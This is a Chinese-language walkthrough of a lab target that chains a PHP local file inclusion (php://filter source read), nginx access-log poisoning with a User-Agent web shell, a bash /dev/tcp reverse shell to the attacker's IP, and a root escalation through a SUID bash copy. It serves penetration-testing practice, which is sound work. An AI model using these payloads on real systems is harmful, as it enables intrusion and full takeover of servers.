**环境**：靶机 10.10.1.106（文档站，nginx），攻击机 Kali 10.10.1.96。

### **<span style="color:#3498db">信息收集</span>**

nmap 扫出 22（SSH）和 80（nginx）。gobuster 带上常见后缀爆破，除了 `docs`、`assets`、`includes` 目录，还发现一个 `view.php`（状态码 200，有内容）：

![mm](/assets/img/2025-06-15-17-39-54.png)
![mm](/assets/img/2025-06-15-18-58-28.png)

### **<span style="color:#3498db">用伪协议确认文件包含</span>**

访问 `view.php` 时 URL 里带着 `doc` 参数，猜测它是在读某个文档。要确认它是不是用 `include` 直接把参数当文件路径包含，用 **php://filter 伪协议**读它自己的源码——伪协议可以理解为"经过 PHP 处理过的特殊文件路径"，`convert.base64-encode` 会让源码在输出前先被 base64 编码，把 PHP 代码变成"数据"打印出来，从而绕开"源码被解析"的问题：

```text
view.php?doc=php://filter/read=convert.base64-encode/resource=view.php
```

![mm](/assets/img/2025-06-15-19-21-08.png)

把返回的 base64 解码，确认 `view.php` 里就是 `include($_GET['doc'])`——**任意文件包含漏洞成立**，包含什么文件就执行什么文件。

### **<span style="color:#3498db">日志投毒</span>**

文件包含光能"读文件"还不够，要能"执行代码"。服务器上有个现成的可写文件：**nginx 的访问日志**——每个请求都会被记录，其中 **User-Agent 头是我们可以完全控制的**。

抓包，把一个请求的 User-Agent 改成 PHP 代码再发出（"访问时写入代码"）：

```text
User-Agent: <?php system($_GET['pzj'].''); ?>
```

![mm](/assets/img/2025-06-16-11-07-00.png)

去看服务器日志，代码已经原样躺在里面了（高亮处）。杂乱的请求记录正好做了掩护：

![mm](/assets/img/2025-06-16-11-08-12.png)

### **<span style="color:#3498db">包含日志执行命令</span>**

现在日志文件里既有 PHP 代码、又能被 `include` 进来——把两者组合起来执行命令。日志的路径是 `/var/log/nginx/access.log`，相对于站点目录往上跳四层：

```text
view.php?doc=../../../../var/log/nginx/access.log&pzj=bash -c 'bash -i >%26/dev/tcp/10.10.1.96/4444 0>%261'
```

注意命令里的 `&` **必须写成 URL 编码 `%26`**，否则会被当成参数分隔符把命令截断。Kali 上先开监听，执行后拿到 www-data 的 shell：

![mm](/assets/img/2025-06-16-14-47-23.png)

### **<span style="color:#3498db">提权：维护脚本留下的 SUID bash</span>**

翻目录时在 `/opt/yxdocs/bin/` 下发现一个隐藏文件 `.rb`，权限很扎眼：`-rwsr-sr-x root root`——**SUID + SGID 全开，属主是 root**，而且 1446024 字节的大小，就是一份 `/bin/bash`：

![mm](/assets/img/2025-06-16-15-11-42.png)

顺着找原因，翻到一个叫 `yxclean` 的脚本，内容明明白白——它会把 bash 复制一份并 **chmod 6755**（6=SUID+SGID，755=常规读写执行）：

```bash
#!/bin/sh
cp /bin/bash /opt/yxdocs/bin/.rb
chmod 6755 /opt/yxdocs/bin/.rb
```

![mm](/assets/img/2025-06-16-15-26-45.png)

相当于有人定期亲手做了个提权后门。直接拿它开一个保留特权的 bash（`-p`：bash 检测到被提权运行时会主动降权，`-p` 才会保留 root）：

```bash
bin/.rb -p
whoami
```

![mm](/assets/img/2025-06-16-15-13-20.png)
![mm](/assets/img/2025-06-16-15-13-34.png)

root 到手。
